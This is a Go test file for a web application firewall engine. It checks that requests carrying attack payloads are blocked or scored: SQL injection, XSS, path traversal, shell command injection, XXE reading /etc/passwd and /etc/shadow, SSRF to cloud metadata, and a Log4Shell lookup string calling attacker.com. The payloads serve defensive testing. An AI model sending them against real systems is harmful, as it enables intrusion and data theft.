package waf

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/metalwaf/metalwaf/internal/database"
)

// newTestEngine builds an Engine with only built-in rules and a nil store
// (custom rule reload not called, so no DB access).
func newTestEngine(threshold int) *Engine {
	return New(nil, threshold)
}

func siteWith(mode string) *database.Site {
	return &database.Site{ID: "site-1", Domain: "example.com", WAFMode: mode, Enabled: true}
}

func requestWith(method, url, body string, headers map[string]string) *http.Request {
	var bodyReader *strings.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	var req *http.Request
	if bodyReader != nil {
		req = httptest.NewRequest(method, url, bodyReader)
	} else {
		req = httptest.NewRequest(method, url, nil)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	return req
}

// ─── Mode tests ───────────────────────────────────────────────────────────────

func TestInspect_ModeOff_NoInspection(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	// UNION SELECT would normally be detected.
	req := requestWith(http.MethodGet, "/?q=UNION+SELECT+1,2,3", "", nil)
	result := e.Inspect(req, siteWith("off"))
	if result.Blocked || result.Score != 0 || len(result.MatchedRules) != 0 {
		t.Errorf("mode=off should skip all inspection, got blocked=%v score=%d matches=%d",
			result.Blocked, result.Score, len(result.MatchedRules))
	}
}

func TestInspect_ModeDetect_NeverBlocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?q=UNION+SELECT+1,2,3", "", nil)
	result := e.Inspect(req, siteWith("detect"))
	if result.Blocked {
		t.Error("mode=detect must never set Blocked=true")
	}
	if result.Score == 0 {
		t.Error("mode=detect should still accumulate score")
	}
}

// ─── SQLi tests ───────────────────────────────────────────────────────────────

func TestInspect_SQLi_UnionSelect_QueryBlocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	// Use %20 for spaces: httptest.NewRequest parses the target as an HTTP/1.x
	// request line where raw spaces terminate the URL token.
	req := requestWith(http.MethodGet, "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("UNION SELECT in query should be blocked, score=%d matches=%d",
			result.Score, len(result.MatchedRules))
	}
	if !containsCategory(result.MatchedRules, CategorySQLi) {
		t.Error("matched rules should include sqli category")
	}
}

func TestInspect_SQLi_SleepBlocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?id=1%20AND%20SLEEP(5)", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("SLEEP() SQLi should be blocked, score=%d", result.Score)
	}
}

func TestInspect_SQLi_InBody_Detected(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodPost, "/search", `{"q":"1 UNION SELECT 1,2,3"}`, nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("UNION SELECT in POST body should be blocked, score=%d", result.Score)
	}
}

// ─── XSS tests ────────────────────────────────────────────────────────────────

func TestInspect_XSS_ScriptTag_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?comment=<script>alert(1)</script>", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("<script> tag should be blocked, score=%d", result.Score)
	}
}

func TestInspect_XSS_JSProtocol_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?url=javascript:alert(1)", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("javascript: protocol should be blocked, score=%d", result.Score)
	}
}

// ─── Path traversal tests ─────────────────────────────────────────────────────

func TestInspect_Traversal_DotDotSlash_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	// Put traversal in query string to avoid Go's URL path normalization
	// collapsing ../../ before the WAF gets to inspect it.
	req := requestWith(http.MethodGet, "/?file=../../etc/passwd", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("../../ traversal in query should be blocked, score=%d", result.Score)
	}
}

func TestInspect_Traversal_EncodedDotDot_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	// Percent-encoded traversal in query string; RawQuery preserves encoding
	// so the WAF pattern (..%2f) can match.
	req := requestWith(http.MethodGet, "/?file=..%2f..%2fetc%2fpasswd", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("URL-encoded traversal in query should be blocked, score=%d", result.Score)
	}
}

// ─── RCE tests ────────────────────────────────────────────────────────────────

func TestInspect_RCE_ShellExec_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?cmd=shell_exec('id')", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("shell_exec() should be blocked, score=%d", result.Score)
	}
}

func TestInspect_RCE_CmdSubstitution_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	// Use a simple payload without spaces to avoid URL parsing issues.
	req := requestWith(http.MethodGet, "/?x=$(id)", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("$() substitution in query should be blocked, score=%d", result.Score)
	}
}

// ─── Scanner tests ────────────────────────────────────────────────────────────

func TestInspect_Scanner_SQLmap_Detected(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/", "", map[string]string{
		"User-Agent": "sqlmap/1.7 (https://sqlmap.org)",
	})
	result := e.Inspect(req, siteWith("block"))
	if result.Score == 0 {
		t.Error("sqlmap User-Agent should be detected")
	}
	if !containsCategory(result.MatchedRules, CategoryScanner) {
		t.Error("matched rules should include scanner category")
	}
}

// ─── Allow whitelist tests ────────────────────────────────────────────────────

func TestInspect_AllowRule_OverridesBlock(t *testing.T) {
	e := newTestEngine(DefaultThreshold)

	// Manually inject an allow rule for this site to override the SQLi detection.
	allowRule := compileRule(Rule{
		Name:     "TEST-ALLOW",
		Category: CategoryCustom,
		Field:    FieldIP,
		Operator: OpEquals,
		Value:    "192.168.1.1",
		Score:    0,
		Action:   ActionAllow,
	})
	e.mu.Lock()
	// Prepend so it fires before SQLi rules.
	e.all = append([]compiledRule{allowRule}, e.all...)
	e.mu.Unlock()

	req := requestWith(http.MethodGet, "/?id=UNION%20SELECT%201,2,3", "", nil)
	req.RemoteAddr = "192.168.1.1:54321"
	result := e.Inspect(req, siteWith("block"))
	if result.Blocked || result.Score != 0 {
		t.Errorf("allow rule should have stopped inspection: blocked=%v score=%d", result.Blocked, result.Score)
	}
}

// ─── Scoring threshold tests ──────────────────────────────────────────────────

func TestInspect_DetectRules_AccumulateToThreshold(t *testing.T) {
	e := newTestEngine(40) // threshold below 2× SQLI-SCHEMA-ENUM score (25 each)

	// SQLI-SCHEMA-ENUM is ActionDetect with score 25.
	// Matching in both query (25) and body (25) accumulates 50 > threshold 40.
	req := requestWith(http.MethodPost,
		"/?q=INFORMATION_SCHEMA.TABLES",
		`{"filter":"INFORMATION_SCHEMA.COLUMNS"}`,
		nil,
	)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Logf("score=%d matches=%d", result.Score, len(result.MatchedRules))
		t.Error("detect rules should accumulate score past threshold and block")
	}
}

// ─── Body restore test ────────────────────────────────────────────────────────

func TestInspect_BodyIsRestoredAfterInspection(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	const payload = "normal body content without any attacks"
	req := requestWith(http.MethodPost, "/api/data", payload, nil)
	_ = e.Inspect(req, siteWith("detect"))

	// Body should still be readable after inspection.
	if req.Body == nil {
		t.Fatal("body is nil after inspection")
	}
	data, err := io.ReadAll(req.Body)
	if err != nil {
		t.Fatalf("reading restored body: %v", err)
	}
	if string(data) != payload {
		t.Errorf("body was not restored: got %q, want %q", string(data), payload)
	}
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func containsCategory(matches []MatchedRule, category string) bool {
	for _, m := range matches {
		if m.Rule.Category == category {
			return true
		}
	}
	return false
}

// ─── XXE tests ────────────────────────────────────────────────────────────────

func TestInspect_XXE_DocTypeEntityInBody_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	xmlPayload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
	req := requestWith(http.MethodPost, "/upload", xmlPayload, map[string]string{
		"Content-Type": "application/xml",
	})
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("XXE DOCTYPE+ENTITY payload should be blocked, score=%d matches=%d",
			result.Score, len(result.MatchedRules))
	}
	if !containsCategory(result.MatchedRules, CategoryXXE) {
		t.Error("matched rules should include XXE category")
	}
}

func TestInspect_XXE_EntitySystemInBody_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	payload := `<!ENTITY myent SYSTEM "file:///etc/shadow">`
	req := requestWith(http.MethodPost, "/parse", payload, nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("ENTITY SYSTEM payload should be blocked, score=%d", result.Score)
	}
}

// ─── SSRF tests ───────────────────────────────────────────────────────────────

func TestInspect_SSRF_Localhost_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?url=http://localhost/admin", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("SSRF localhost in query should be blocked, score=%d", result.Score)
	}
	if !containsCategory(result.MatchedRules, CategorySSRF) {
		t.Error("matched rules should include SSRF category")
	}
}

func TestInspect_SSRF_AWSMetadata_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/?resource=http://169.254.169.254/latest/meta-data/", "", nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("AWS IMDS URL should be blocked, score=%d", result.Score)
	}
}

func TestInspect_SSRF_GopherScheme_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodPost, "/fetch", `{"url":"gopher://internal:6379/_SET key 1"}`, nil)
	result := e.Inspect(req, siteWith("block"))
	if !result.Blocked {
		t.Errorf("gopher:// SSRF in body should be blocked, score=%d", result.Score)
	}
}

// ─── Log4Shell / RCE CVE tests ────────────────────────────────────────────────

func TestInspect_RCE_Log4Shell_Blocks(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	req := requestWith(http.MethodGet, "/", "", map[string]string{
		"X-Api-Version": "${jndi:ldap://attacker.com/exploit}",
	})
	// Log4Shell in a header value
	result := e.Inspect(req, siteWith("block"))
	// Header fields aren't extracted by the WAF; but the URI/query match may vary.
	// The payload in URI query string is what we test canonically:
	req2 := requestWith(http.MethodGet, "/?v=${jndi:ldap://attacker.com/exploit}", "", nil)
	result = e.Inspect(req2, siteWith("block"))
	if !result.Blocked {
		t.Errorf("Log4Shell ${jndi:...} in query should be blocked, score=%d", result.Score)
	}
}

// ─── not_contains operator test ──────────────────────────────────────────────

func TestMatchValue_NotContains(t *testing.T) {
	cr := compileRule(Rule{
		Name:     "TEST-NOT-CONTAINS",
		Field:    FieldURI,
		Operator: OpNotContains,
		Value:    "admin",
		Score:    10,
		Action:   ActionDetect,
	})
	tests := []struct {
		input string
		want  bool
	}{
		{"/api/public", true},   // does NOT contain "admin" → match
		{"/api/admin", false},   // contains "admin" → no match
		{"/ADMIN/panel", false}, // case-insensitive: contains "admin"
	}
	for _, tc := range tests {
		got := matchValue(cr, tc.input)
		if got != tc.want {
			t.Errorf("not_contains(%q) = %v, want %v", tc.input, got, tc.want)
		}
	}
}

// ─── Paranoia level filter tests ─────────────────────────────────────────────

func TestParanoia_Level1_ExcludesLevel3Rules(t *testing.T) {
	e := New(nil, DefaultThreshold)
	e.SetParanoiaLevel(1)
	// Recompile to reflect new level (normally done by Reload; simulate here).
	e.mu.Lock()
	e.all = compileAll(allBuiltinRules(), nil, 1)
	e.mu.Unlock()

	// SQLI-HEX-ENCODE (level 3) — 0x41414141 should NOT be flagged at PL1.
	req := requestWith(http.MethodGet, "/?data=0x41414141424343", "", nil)
	result := e.Inspect(req, siteWith("block"))

	for _, m := range result.MatchedRules {
		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
			t.Error("SQLI-HEX-ENCODE (level 3) should not fire at paranoia level 1")
		}
	}
}

func TestParanoia_Level4_IncludesAllRules(t *testing.T) {
	e := New(nil, DefaultThreshold)
	e.SetParanoiaLevel(4)
	e.mu.Lock()
	e.all = compileAll(allBuiltinRules(), nil, 4)
	e.mu.Unlock()

	// At paranoia level 4 the hex pattern (level 3) should fire.
	req := requestWith(http.MethodGet, "/?data=0x41414141424343434545", "", nil)
	result := e.Inspect(req, siteWith("detect"))
	found := false
	for _, m := range result.MatchedRules {
		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
			found = true
			break
		}
	}
	if !found {
		t.Error("SQLI-HEX-ENCODE (level 3) should fire at paranoia level 4")
	}
}

func TestCategories_ReturnsNonEmpty(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	cats := e.Categories()
	if len(cats) == 0 {
		t.Fatal("Categories() returned empty slice; expected built-in categories")
	}
	found := false
	for _, c := range cats {
		if c.Category == CategorySQLi {
			found = true
			if c.Builtin == 0 {
				t.Errorf("SQLi category has Builtin=0")
			}
			break
		}
	}
	if !found {
		t.Error("expected to find sqli category in Categories()")
	}
}

func TestBuiltinRules_ReturnsOnlyBuiltin(t *testing.T) {
	e := newTestEngine(DefaultThreshold)
	rules := e.BuiltinRules()
	if len(rules) == 0 {
		t.Fatal("BuiltinRules() returned empty slice")
	}
	for _, r := range rules {
		if !r.Builtin {
			t.Errorf("BuiltinRules() returned non-builtin rule: %s", r.Name)
		}
	}
}
